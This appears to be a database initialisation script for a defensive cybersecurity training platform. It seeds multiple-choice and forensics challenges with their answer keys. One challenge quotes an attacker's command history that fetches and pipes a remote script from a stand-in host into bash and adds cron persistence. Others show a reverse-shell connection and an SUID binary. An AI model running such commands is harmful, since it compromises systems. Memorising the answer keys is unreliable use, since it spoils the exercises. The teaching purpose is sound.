#!/bin/bash

echo "========================================"
echo "数据库初始化脚本 - 确保只有英文题目"
echo "========================================"
echo ""

docker compose exec -T backend node << 'NODEJS'
const { run, all } = require('./src/models/database');

async function initDatabase() {
  console.log('🔍 检查数据库...');

  // 1. 删除所有题目
  await run('DELETE FROM challenges');
  await run('DELETE FROM submissions');
  await run('DELETE FROM phase_submissions');
  console.log('✅ 已清空旧题目');

  // 2. 插入5道英文选择题
  const mcChallenges = [
    {
      id: 1, type: 'multiple_choice', title: 'Basic Defense Knowledge',
      description: 'Which command can view all running processes in a Linux system?',
      category: 'Basic Knowledge', points: 100, difficulty: 'easy', answer: 'B',
      hints: JSON.stringify([
        {value: 'A', label: 'ls'},
        {value: 'B', label: 'ps'},
        {value: 'C', label: 'top'},
        {value: 'D', label: 'netstat'}
      ])
    },
    {
      id: 2, type: 'multiple_choice', title: 'Log Analysis',
      description: 'When analyzing intrusion incidents, which log file typically stores user login records in Linux?',
      category: 'Log Analysis', points: 100, difficulty: 'easy', answer: 'C',
      hints: JSON.stringify([
        {value: 'A', label: '/var/log/messages'},
        {value: 'B', label: '/var/log/syslog'},
        {value: 'C', label: '/var/log/auth.log'},
        {value: 'D', label: '/var/log/kern.log'}
      ])
    },
    {
      id: 3, type: 'multiple_choice', title: 'Network Security',
      description: 'In iptables, which chain is used to process packets destined for the local machine?',
      category: 'Network Defense', points: 150, difficulty: 'medium', answer: 'A',
      hints: JSON.stringify([
        {value: 'A', label: 'INPUT'},
        {value: 'B', label: 'OUTPUT'},
        {value: 'C', label: 'FORWARD'},
        {value: 'D', label: 'PREROUTING'}
      ])
    },
    {
      id: 4, type: 'multiple_choice', title: 'Incident Response',
      description: 'When a backdoor is discovered on the system, which operation should be performed first?',
      category: 'Incident Response', points: 150, difficulty: 'medium', answer: 'B',
      hints: JSON.stringify([
        {value: 'A', label: 'Delete backdoor files immediately'},
        {value: 'B', label: 'Disconnect network connection'},
        {value: 'C', label: 'Restart the system'},
        {value: 'D', label: 'Change all passwords'}
      ])
    },
    {
      id: 5, type: 'multiple_choice', title: 'Threat Detection',
      description: 'Which behavior most likely indicates the presence of a crypto mining trojan?',
      category: 'Threat Identification', points: 200, difficulty: 'hard', answer: 'D',
      hints: JSON.stringify([
        {value: 'A', label: 'Disk space rapidly decreasing'},
        {value: 'B', label: 'Network traffic suddenly increasing'},
        {value: 'C', label: 'Frequent DNS queries'},
        {value: 'D', label: 'CPU usage consistently above 90%'}
      ])
    }
  ];

  for (const c of mcChallenges) {
    await run(
      'INSERT INTO challenges (id, type, title, description, category, points, difficulty, answer, hints, is_active) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1)',
      [c.id, c.type, c.title, c.description, c.category, c.points, c.difficulty, c.answer, c.hints]
    );
  }
  console.log('✅ 已插入5道英文选择题');

  // 3. 插入5道英文实操题
  const practicalChallenges = [
    {
      id: 6, type: 'practical', title: 'Linux Process Forensics',
      description: 'Your server is exhibiting abnormal behavior with unusually high CPU usage. Analysis reveals a suspicious process.\n\n**Scenario**:\n- Process name: /tmp/.systemd-monitor\n- PID: 1337\n- Parent process: init\n- User: root\n- CPU usage: 95%\n\n**Task**: What type of malicious program is this process most likely? (Answer in one word: CryptoMiner/RemoteControl/Ransomware/DDoSTrojan)',
      category: 'Linux Forensics', points: 300, difficulty: 'medium', answer: 'CryptoMiner',
      hints: JSON.stringify(['Note CPU usage', 'Process located in temporary directory', 'Disguised as system process'])
    },
    {
      id: 7, type: 'practical', title: 'Log Analysis Practice',
      description: 'Analyze the following auth.log excerpt and identify the attack type:\n\n```\nJan 15 10:23:11 server sshd[12345]: Failed password for root from 192.168.1.100 port 52134 ssh2\nJan 15 10:23:15 server sshd[12346]: Failed password for root from 192.168.1.100 port 52135 ssh2\nJan 15 10:23:18 server sshd[12347]: Failed password for admin from 192.168.1.100 port 52136 ssh2\nJan 15 10:23:21 server sshd[12348]: Failed password for admin from 192.168.1.100 port 52137 ssh2\nJan 15 10:23:24 server sshd[12349]: Accepted password for admin from 192.168.1.100 port 52138 ssh2\n```\n\n**Task**: What type of attack is this? (Answer: BruteForce/SQLInjection/XSS/CSRF)',
      category: 'Log Analysis', points: 250, difficulty: 'easy', answer: 'BruteForce',
      hints: JSON.stringify(['Multiple failed attempts', 'Final successful login', 'SSH service'])
    },
    {
      id: 8, type: 'practical', title: 'Command Identification',
      description: 'You found the following command history on the server:\n\n```bash\ncurl http://malicious.com/shell.sh | bash\nchmod +x /tmp/.hidden\nnohup /tmp/.hidden &\necho "*/5 * * * * /tmp/.hidden" | crontab -\n```\n\n**Task**: What is the purpose of the attacker\'s last command? (Answer: Persistence/InformationGathering/LateralMovement/CoveringTracks)',
      category: 'Command Analysis', points: 300, difficulty: 'medium', answer: 'Persistence',
      hints: JSON.stringify(['Purpose of crontab', 'Scheduled task', 'Persistence'])
    },
    {
      id: 9, type: 'practical', title: 'Port Analysis',
      description: 'Found the following suspicious connection using netstat:\n\n```\ntcp    0    0 10.0.1.15:33456    185.220.101.5:4444    ESTABLISHED    1337/systemd\n```\n\n**Task**: Based on port characteristics, what type of connection is this most likely? (Answer: ReverseShell/ForwardProxy/DatabaseConnection/WebService)',
      category: 'Network Analysis', points: 350, difficulty: 'hard', answer: 'ReverseShell',
      hints: JSON.stringify(['What is port 4444 commonly used for', 'Metasploit default port', 'Local process connecting outward'])
    },
    {
      id: 10, type: 'practical', title: 'File Forensics',
      description: 'A suspicious file was discovered during system inspection:\n\n```bash\n-rwsr-xr-x 1 root root 8192 Jan 15 03:22 /usr/bin/find\n```\n\n**Task**: What security risk does this file\'s permission setting pose? (Answer: SUIDEscalation/DirectoryTraversal/BufferOverflow/PermissionLeak)',
      category: 'Linux Forensics', points: 400, difficulty: 'hard', answer: 'SUIDEscalation',
      hints: JSON.stringify(['Note file permission flags', 'Meaning of the s bit', 'Root-owned executable file'])
    }
  ];

  for (const c of practicalChallenges) {
    await run(
      'INSERT INTO challenges (id, type, title, description, category, points, difficulty, answer, hints, is_active) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1)',
      [c.id, c.type, c.title, c.description, c.category, c.points, c.difficulty, c.answer, c.hints]
    );
  }
  console.log('✅ 已插入5道英文实操题');

  // 4. 插入应急响应事件
  await run(
    'INSERT INTO challenges (id, type, title, description, category, points, difficulty, answer, hints, is_active) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1)',
    [41, 'incident_response', 'Server Compromise - SSH Brute Force Attack',
     'A production web server (10.0.1.15) has been compromised. The monitoring system detected unusual CPU usage and suspicious network connections. Your task is to investigate the incident following the standard SOP and complete all phases of the incident response process.',
     'Incident Response', 1000, 'hard', 'Complete all 5 phases',
     JSON.stringify(['Check system logs first', 'Focus on authentication logs', 'Look for suspicious processes'])]
  );
  console.log('✅ 已插入应急响应事件');

  // 验证
  const final = await all('SELECT id, title, type FROM challenges ORDER BY id');
  console.log('\n📊 最终题目列表:');
  final.forEach(c => console.log(`  ${c.id}. ${c.title} (${c.type})`));

  console.log('\n✅ 数据库初始化完成！共 ' + final.length + ' 道题目，全部为英文');

  process.exit(0);
}

initDatabase();
NODEJS

echo ""
echo "✅ 数据库初始化完成！"
echo ""
